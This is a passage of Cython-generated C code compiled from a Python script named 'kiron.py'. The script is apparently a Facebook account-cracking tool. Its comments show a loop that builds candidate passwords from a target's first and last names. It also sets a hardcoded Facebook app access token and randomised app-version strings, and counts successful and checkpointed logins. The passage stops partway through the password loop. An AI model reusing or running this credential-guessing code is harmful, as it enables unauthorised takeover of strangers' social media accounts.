 *                 sys.stdout.write(f'\r\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m|\x1b[1;91m%s\x1b[38;5;244m] '%(loop,len(oks),len(cps)));sys.stdout.flush()
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "kiron.py":574
 *         try:
 *                 global oks,loop,sim_id
 *                 sys.stdout.write(f'\r\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m|\x1b[1;91m%s\x1b[38;5;244m] '%(loop,len(oks),len(cps)));sys.stdout.flush()             # <<<<<<<<<<<<<<
 *                 fn = names.split(' ')[0]
 *                 try:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sys); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_stdout); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_write); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = PyTuple_New(3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_7 = 0;
      __pyx_t_8 = 127;
      __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_6);
      __pyx_t_7 += 24;
      __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_6);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_kp_u_38_5_244m_38_5_46m_6);
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_date); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_8;
      __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_10);
      __pyx_t_10 = 0;
      __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_38_5_244m_38);
      __pyx_t_7 += 128;
      __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_38_5_244m_38);
      PyTuple_SET_ITEM(__pyx_t_6, 2, __pyx_kp_u_38_5_244m_38_5_46m_38_5_244m_38);
      __pyx_t_10 = __Pyx_PyUnicode_Join(__pyx_t_6, 3, __pyx_t_7, __pyx_t_8); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_loop); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_oks); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_7 = PyObject_Length(__pyx_t_9); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = PyInt_FromSsize_t(__pyx_t_7); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_cps); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_7 = PyObject_Length(__pyx_t_11); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __pyx_t_11 = PyInt_FromSsize_t(__pyx_t_7); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_12 = PyTuple_New(3); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_GIVEREF(__pyx_t_6);
      if (__Pyx_PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_t_6)) __PYX_ERR(0, 574, __pyx_L3_error);
      __Pyx_GIVEREF(__pyx_t_9);
      if (__Pyx_PyTuple_SET_ITEM(__pyx_t_12, 1, __pyx_t_9)) __PYX_ERR(0, 574, __pyx_L3_error);
      __Pyx_GIVEREF(__pyx_t_11);
      if (__Pyx_PyTuple_SET_ITEM(__pyx_t_12, 2, __pyx_t_11)) __PYX_ERR(0, 574, __pyx_L3_error);
      __pyx_t_6 = 0;
      __pyx_t_9 = 0;
      __pyx_t_11 = 0;
      __pyx_t_11 = PyUnicode_Format(__pyx_t_10, __pyx_t_12); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_12 = NULL;
      __pyx_t_13 = 0;
      #if CYTHON_UNPACK_METHODS
      if (likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_12)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_12);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
          __pyx_t_13 = 1;
        }
      }
      #endif
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_12, __pyx_t_11};
        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_13, 1+__pyx_t_13);
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 574, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sys); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_stdout); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_flush); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 574, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __pyx_t_11 = NULL;
      __pyx_t_13 = 0;
      #if CYTHON_UNPACK_METHODS
      if (likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_11)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_11);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
          __pyx_t_13 = 1;
        }
      }
      #endif
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_11, NULL};
        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 574, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      /* "kiron.py":575
 *                 global oks,loop,sim_id
 *                 sys.stdout.write(f'\r\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m|\x1b[1;91m%s\x1b[38;5;244m] '%(loop,len(oks),len(cps)));sys.stdout.flush()
 *                 fn = names.split(' ')[0]             # <<<<<<<<<<<<<<
 *                 try:
 *                         ln = names.split(' ')[1]
 */
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_names, __pyx_n_s_split); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 575, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_11 = NULL;
      __pyx_t_13 = 0;
      #if CYTHON_UNPACK_METHODS
      if (likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_11)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_11);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
          __pyx_t_13 = 1;
        }
      }
      #endif
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_11, __pyx_kp_s__25};
        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_13, 1+__pyx_t_13);
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 575, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }
      __pyx_t_5 = __Pyx_GetItemInt(__pyx_t_4, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 575, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_fn = __pyx_t_5;
      __pyx_t_5 = 0;

      /* "kiron.py":576
 *                 sys.stdout.write(f'\r\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m|\x1b[1;91m%s\x1b[38;5;244m] '%(loop,len(oks),len(cps)));sys.stdout.flush()
 *                 fn = names.split(' ')[0]
 *                 try:             # <<<<<<<<<<<<<<
 *                         ln = names.split(' ')[1]
 *                 except:
 */
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_15, &__pyx_t_16);
        __Pyx_XGOTREF(__pyx_t_14);
        __Pyx_XGOTREF(__pyx_t_15);
        __Pyx_XGOTREF(__pyx_t_16);
        /*try:*/ {

          /* "kiron.py":577
 *                 fn = names.split(' ')[0]
 *                 try:
 *                         ln = names.split(' ')[1]             # <<<<<<<<<<<<<<
 *                 except:
 *                         ln = fn
 */
          __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_names, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 577, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_11 = NULL;
          __pyx_t_13 = 0;
          #if CYTHON_UNPACK_METHODS
          if (likely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_11)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
              __Pyx_INCREF(__pyx_t_11);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_4, function);
              __pyx_t_13 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_11, __pyx_kp_s__25};
            __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_13, 1+__pyx_t_13);
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 577, __pyx_L9_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          }
          __pyx_t_4 = __Pyx_GetItemInt(__pyx_t_5, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 577, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_v_ln = __pyx_t_4;
          __pyx_t_4 = 0;

          /* "kiron.py":576
 *                 sys.stdout.write(f'\r\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m|\x1b[1;91m%s\x1b[38;5;244m] '%(loop,len(oks),len(cps)));sys.stdout.flush()
 *                 fn = names.split(' ')[0]
 *                 try:             # <<<<<<<<<<<<<<
 *                         ln = names.split(' ')[1]
 *                 except:
 */
        }
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
        __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
        goto __pyx_L14_try_end;
        __pyx_L9_error:;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

        /* "kiron.py":578
 *                 try:
 *                         ln = names.split(' ')[1]
 *                 except:             # <<<<<<<<<<<<<<
 *                         ln = fn
 *                 for pw in passlist:
 */
        /*except:*/ {
          __Pyx_AddTraceback("kiron.api2", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_5, &__pyx_t_11) < 0) __PYX_ERR(0, 578, __pyx_L11_except_error)
          __Pyx_XGOTREF(__pyx_t_4);
          __Pyx_XGOTREF(__pyx_t_5);
          __Pyx_XGOTREF(__pyx_t_11);

          /* "kiron.py":579
 *                         ln = names.split(' ')[1]
 *                 except:
 *                         ln = fn             # <<<<<<<<<<<<<<
 *                 for pw in passlist:
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 */
          __Pyx_INCREF(__pyx_v_fn);
          __Pyx_XDECREF_SET(__pyx_v_ln, __pyx_v_fn);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          goto __pyx_L10_exception_handled;
        }

        /* "kiron.py":576
 *                 sys.stdout.write(f'\r\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m|\x1b[1;91m%s\x1b[38;5;244m] '%(loop,len(oks),len(cps)));sys.stdout.flush()
 *                 fn = names.split(' ')[0]
 *                 try:             # <<<<<<<<<<<<<<
 *                         ln = names.split(' ')[1]
 *                 except:
 */
        __pyx_L11_except_error:;
        __Pyx_XGIVEREF(__pyx_t_14);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_XGIVEREF(__pyx_t_16);
        __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
        goto __pyx_L3_error;
        __pyx_L10_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_14);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_XGIVEREF(__pyx_t_16);
        __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
        __pyx_L14_try_end:;
      }

      /* "kiron.py":580
 *                 except:
 *                         ln = fn
 *                 for pw in passlist:             # <<<<<<<<<<<<<<
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 */
      if (likely(PyList_CheckExact(__pyx_v_passlist)) || PyTuple_CheckExact(__pyx_v_passlist)) {
        __pyx_t_11 = __pyx_v_passlist; __Pyx_INCREF(__pyx_t_11);
        __pyx_t_7 = 0;
        __pyx_t_17 = NULL;
      } else {
        __pyx_t_7 = -1; __pyx_t_11 = PyObject_GetIter(__pyx_v_passlist); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 580, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_17 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_11); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 580, __pyx_L3_error)
      }
      for (;;) {
        if (likely(!__pyx_t_17)) {
          if (likely(PyList_CheckExact(__pyx_t_11))) {
            {
              Py_ssize_t __pyx_temp = __Pyx_PyList_GET_SIZE(__pyx_t_11);
              #if !CYTHON_ASSUME_SAFE_MACROS
              if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 580, __pyx_L3_error)
              #endif
              if (__pyx_t_7 >= __pyx_temp) break;
            }
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_5 = PyList_GET_ITEM(__pyx_t_11, __pyx_t_7); __Pyx_INCREF(__pyx_t_5); __pyx_t_7++; if (unlikely((0 < 0))) __PYX_ERR(0, 580, __pyx_L3_error)
            #else
            __pyx_t_5 = __Pyx_PySequence_ITEM(__pyx_t_11, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 580, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            #endif
          } else {
            {
              Py_ssize_t __pyx_temp = __Pyx_PyTuple_GET_SIZE(__pyx_t_11);
              #if !CYTHON_ASSUME_SAFE_MACROS
              if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 580, __pyx_L3_error)
              #endif
              if (__pyx_t_7 >= __pyx_temp) break;
            }
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_5 = PyTuple_GET_ITEM(__pyx_t_11, __pyx_t_7); __Pyx_INCREF(__pyx_t_5); __pyx_t_7++; if (unlikely((0 < 0))) __PYX_ERR(0, 580, __pyx_L3_error)
            #else
            __pyx_t_5 = __Pyx_PySequence_ITEM(__pyx_t_11, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 580, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            #endif
          }
        } else {
          __pyx_t_5 = __pyx_t_17(__pyx_t_11);
          if (unlikely(!__pyx_t_5)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 580, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_5);
        }
        __Pyx_XDECREF_SET(__pyx_v_pw, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":581
 *                         ln = fn
 *                 for pw in passlist:
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())             # <<<<<<<<<<<<<<
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 */
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_v_pw, __pyx_n_s_replace); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 581, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_20 = __Pyx_PyObject_GetAttrStr(__pyx_v_fn, __pyx_n_s_lower); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 581, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_20);
        __pyx_t_21 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_20))) {
          __pyx_t_21 = PyMethod_GET_SELF(__pyx_t_20);
          if (likely(__pyx_t_21)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_20);
            __Pyx_INCREF(__pyx_t_21);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_20, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_21, NULL};
          __pyx_t_19 = __Pyx_PyObject_FastCall(__pyx_t_20, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
          if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 581, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_19);
          __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
        }
        __pyx_t_20 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_20 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_20)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_20);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_20, __pyx_n_s_first, __pyx_t_19};
          __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_18, __pyx_callargs+1-__pyx_t_13, 2+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
          __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 581, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        }
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_replace); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 581, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_6, __pyx_n_s_First, __pyx_v_fn};
          __pyx_t_9 = __Pyx_PyObject_FastCall(__pyx_t_18, __pyx_callargs+1-__pyx_t_13, 2+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 581, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        }
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_replace); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 581, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_ln, __pyx_n_s_lower); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 581, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_19 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_19 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_19)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_19);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_19, NULL};
          __pyx_t_9 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
          if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 581, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        }
        __pyx_t_6 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_6, __pyx_n_s_last, __pyx_t_9};
          __pyx_t_10 = __Pyx_PyObject_FastCall(__pyx_t_18, __pyx_callargs+1-__pyx_t_13, 2+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 581, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        }
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_replace); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 581, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_10 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
